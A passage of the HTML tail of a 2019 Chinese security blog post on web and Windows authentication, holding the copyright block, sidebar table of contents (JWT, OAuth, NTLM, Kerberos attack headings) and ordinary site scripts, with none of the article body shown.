  </li>
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    1ypt0
  </li>
  <li class="post-copyright-author">
    <strong>发布时间:</strong>
    2019年04月21日 - 14:04
  </li>
  <li class="post-copyright-author">
    <strong>最后更新:</strong>
    2019年04月21日 - 15:04
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://lypto.me/2019/04/21/认证琐碎/" title="认证琐碎">http://lypto.me/2019/04/21/认证琐碎/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>


      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web/" rel="tag"># web</a>
          
            <a href="/tags/认证/" rel="tag"># 认证</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/03/31/浅析web浏览器安全/" rel="next" title="浅析web浏览器安全">
                <i class="fa fa-chevron-left"></i> 浅析web浏览器安全
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
        <!-- JiaThis Button BEGIN -->
<div class="jiathis_style">
  <a class="jiathis_button_tsina"></a>
  <a class="jiathis_button_tqq"></a>
  <a class="jiathis_button_weixin"></a>
  <a class="jiathis_button_cqq"></a>
  <a class="jiathis_button_douban"></a>
  <a class="jiathis_button_renren"></a>
  <a class="jiathis_button_qzone"></a>
  <a class="jiathis_button_kaixin001"></a>
  <a class="jiathis_button_copy"></a>
  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
  <a class="jiathis_counter_style"></a>
</div>
<script type="text/javascript">
  var jiathis_config={
    hideMore:false
  }
</script>
<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
<!-- JiaThis Button END -->

      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>
  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="1ypt0">
          <p class="site-author-name" itemprop="name">1ypt0</p>
           
              <p class="site-description motion-element" itemprop="description">Please remember that. The Titanic was not supposed to sink, but it did.</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">50</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">21</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">51</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>

<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">


        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  GMail
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              Links
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://cesslab.club/#/" title="cesslab" target="_blank">cesslab</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://firmianay.github.io/" title="超哥" target="_blank">超哥</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://nen9ma0.github.io/" title="大能猫" target="_blank">大能猫</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://dimo233.github.io/" title="去师" target="_blank">去师</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.k0rz3n.com" title="天师" target="_blank">天师</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://notwo1f.github.io/" title="武师" target="_blank">武师</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="http://1phan.cc/" title="1phan" target="_blank">1phan</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="http://www.sky3.pw/" title="sky" target="_blank">sky</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="http://lookupes.com/" title="lookup" target="_blank">lookup</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://herbwen.com/" title="文师" target="_blank">文师</a>
                </li>
              
            </ul>
          </div>
        

        


      </div></section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序"><span class="nav-number">1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie，session，JWT"><span class="nav-number">2.</span> <span class="nav-text">cookie，session，JWT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie的六元组的理解"><span class="nav-number">2.1.</span> <span class="nav-text">cookie的六元组的理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#会话控制关键配置php-ini"><span class="nav-number">2.2.</span> <span class="nav-text">会话控制关键配置php.ini</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-修改认证方式（空认证和HS256认证的缺陷）"><span class="nav-number">2.3.</span> <span class="nav-text">1.修改认证方式（空认证和HS256认证的缺陷）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-弱认证方式的暴力破解"><span class="nav-number">2.4.</span> <span class="nav-text">2.弱认证方式的暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-使用refresh-token和access-token-的非关联性脆弱"><span class="nav-number">2.5.</span> <span class="nav-text">3.使用refresh token和access token 的非关联性脆弱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-JWT中字段涉数据库查询的注入利用"><span class="nav-number">2.6.</span> <span class="nav-text">4.JWT中字段涉数据库查询的注入利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSO单点认证"><span class="nav-number">3.</span> <span class="nav-text">SSO单点认证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SAML"><span class="nav-number">3.1.</span> <span class="nav-text">SAML</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oauth与OpenID"><span class="nav-number">4.</span> <span class="nav-text">Oauth与OpenID</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OpenID"><span class="nav-number">4.1.</span> <span class="nav-text">OpenID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oauth"><span class="nav-number">4.2.</span> <span class="nav-text">Oauth</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#授权码模式"><span class="nav-number">4.2.1.</span> <span class="nav-text">授权码模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简化授权码模式（隐式模式）"><span class="nav-number">4.2.2.</span> <span class="nav-text">简化授权码模式（隐式模式）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#登陆模式"><span class="nav-number">4.2.3.</span> <span class="nav-text">登陆模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端模式"><span class="nav-number">4.2.4.</span> <span class="nav-text">客户端模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oauth安全问题"><span class="nav-number">4.3.</span> <span class="nav-text">Oauth安全问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows-认证"><span class="nav-number">5.</span> <span class="nav-text">windows 认证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM认证"><span class="nav-number">5.1.</span> <span class="nav-text">NTLM认证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kerberos认证"><span class="nav-number">5.2.</span> <span class="nav-text">kerberos认证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于windows认证存在的攻击方式"><span class="nav-number">5.3.</span> <span class="nav-text">关于windows认证存在的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PTH（Pass-The-Hash）"><span class="nav-number">5.3.1.</span> <span class="nav-text">PTH（Pass The Hash）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTT（Pass-The-Ticket）"><span class="nav-number">5.3.2.</span> <span class="nav-text">PTT（Pass The Ticket）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MS14-068"><span class="nav-number">5.3.3.</span> <span class="nav-text">MS14-068</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberoasting"><span class="nav-number">5.3.4.</span> <span class="nav-text">Kerberoasting</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">1ypt0</span>
</div>

        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>

  
  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>

  
  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>

  
  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>

  
  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>

  
  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



  


  

    
      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'http://lypto.me/2019/04/21/认证琐碎/';
          this.page.identifier = '2019/04/21/认证琐碎/';
          this.page.title = '认证琐碎';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://iversion lee.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  
    
    <script>
      var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
        target: "cloud-tie-wrapper"
      };
    </script>
    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (search_path.endsWith("json")) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  


  

  

</div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end --></body></html>